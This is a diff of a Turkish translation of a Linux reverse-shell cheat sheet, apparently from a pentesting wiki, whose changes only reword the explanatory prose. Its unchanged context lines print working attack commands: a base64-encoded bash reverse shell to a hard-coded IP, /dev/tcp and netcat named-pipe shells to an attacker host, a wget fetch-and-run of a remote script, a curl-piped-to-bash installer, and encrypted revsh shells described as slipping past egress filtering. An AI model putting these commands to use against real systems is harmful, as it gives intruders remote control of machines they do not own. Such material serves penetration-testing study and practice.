@@ -34,20 +34,20 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 ```
 #### Shell açıklaması
 
-1. **`bash -i`**: Bu komutun bu kısmı etkileşimli (`-i`) bir Bash shell başlatır.
-2. **`>&`**: Bu komutun bu kısmı **standart çıktıyı** (`stdout`) ve **standart hatayı** (`stderr`) **aynı hedefe yönlendirmek için** kısayol notasyonudur.
+1. **`bash -i`**: Bu komutun kısmı etkileşimli (`-i`) Bash shell'ini başlatır.
+2. **`>&`**: Bu komutun kısmı **standart çıktıyı** (`stdout`) ve **standart hatayı** (`stderr`) **aynı hedefe yönlendirmek için** kısayol notasyonudur.
 3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Bu, **belirtilen IP adresine ve porta bir TCP bağlantısını temsil eden** özel bir dosyadır.
 - **Çıktı ve hata akışlarını bu dosyaya yönlendirerek**, komut etkili bir şekilde etkileşimli shell oturumunun çıktısını saldırganın makinesine gönderir.
-4. **`0>&1`**: Bu komutun bu kısmı **standart girişi (`stdin`) standart çıktının (`stdout`) aynı hedefine yönlendirir**.
+4. **`0>&1`**: Bu komutun kısmı **standart girişi (`stdin`) standart çıktının (`stdout`) aynı hedefine yönlendirir**.
 
-### Dosyada oluştur ve çalıştır
+### Dosya oluştur ve çalıştır
 ```bash
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
 ```
 ## Forward Shell
 
-Linux tabanlı bir web uygulamasında **Remote Code Execution (RCE)** zafiyeti ile uğraşırken, bir reverse shell elde etmek iptables kuralları veya karmaşık paket filtreleme mekanizmaları gibi ağ savunmaları tarafından engellenebilir. Böyle kısıtlı ortamlarda, ele geçirilmiş sistemle daha etkili bir şekilde etkileşim kurmak için bir PTY (Pseudo Terminal) shell oluşturmak alternatif bir yaklaşım sunar.
+Bir **Remote Code Execution (RCE)** zafiyeti ile bir Linux tabanlı web uygulamasıyla uğraşırken, ters bir shell elde etmek, iptables kuralları veya karmaşık paket filtreleme mekanizmaları gibi ağ savunmaları tarafından engellenebilir. Böyle kısıtlı ortamlarda, ele geçirilmiş sistemle daha etkili bir şekilde etkileşim kurmak için bir PTY (Pseudo Terminal) shell kurmak alternatif bir yaklaşım olarak öne çıkmaktadır.
 
 Bu amaç için önerilen bir araç [toboggan](https://github.com/n3rada/toboggan.git) olup, hedef ortamla etkileşimi basitleştirir.
 
@@ -75,7 +75,7 @@ response.raise_for_status()
 
 return response.text
 ```
-Ve sonra, şunu çalıştırabilirsiniz:
+Ve ardından şunu çalıştırabilirsiniz:
 ```shell
 toboggan -m nix.py -i
 ```
@@ -86,8 +86,8 @@ Başka bir olasılık, `IppSec` ileri shell uygulamasını kullanmaktır [**http
 Sadece şunları değiştirmeniz gerekiyor:
 
 - Zayıf hedefin URL'si
-- Yükünüzün ön eki ve son eki (varsa)
-- Yükün gönderilme şekli (başlıklar? veri? ek bilgi?)
+- Yükleminizin ön eki ve son eki (varsa)
+- Yüklemin nasıl gönderileceği (başlıklar? veri? ek bilgi?)
 
 Sonra, sadece **komutlar gönderebilir** veya hatta **tam bir PTY almak için `upgrade` komutunu** kullanabilirsiniz (boruların yaklaşık 1.3 saniyelik bir gecikme ile okunduğunu ve yazıldığını unutmayın).
 
@@ -101,7 +101,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <
 ```
 ## gsocket
 
-Bunu kontrol et [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
+Bunu kontrol etin [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
 ```bash
 bash -c "$(curl -fsSL gsocket.io/x)"
 ```
@@ -255,11 +255,11 @@ revsh -c 0.0.0.0:443 -key key.pem -cert cert.pem
 ./revsh <ATTACKER-IP>:443
 ```
 Faydalı bayraklar:
-- `-b` : tersine yerine bind-shell
+- `-b` : tersine yerine bağlama kabuğu
 - `-p socks5://127.0.0.1:9050` : TOR/HTTP/SOCKS üzerinden proxy
 - `-t` : bir TUN arayüzü oluştur (ters VPN)
 
-Tüm oturum şifreli ve çoklu olduğundan, genellikle düz metin `/dev/tcp` shell'ini öldürecek basit çıkış filtrelemesini atlar.
+Tüm oturum şifreli ve çoklu olduğundan, genellikle düz metin `/dev/tcp` kabuğunu öldürecek basit çıkış filtrelemesini atlar.
 
 ## OpenSSL
 
@@ -338,7 +338,7 @@ Bu, sisteminize 6001 numaralı portta bağlanmaya çalışacaktır:
 ```bash
 xterm -display 10.0.0.1:1
 ```
-Ters shell'i yakalamak için (port 6001'de dinleyecek) şunu kullanabilirsiniz:
+Ters shell'i yakalamak için (6001 numaralı portta dinleyecek) şunu kullanabilirsiniz:
 ```bash
 # Authorize host
 xhost +targetip
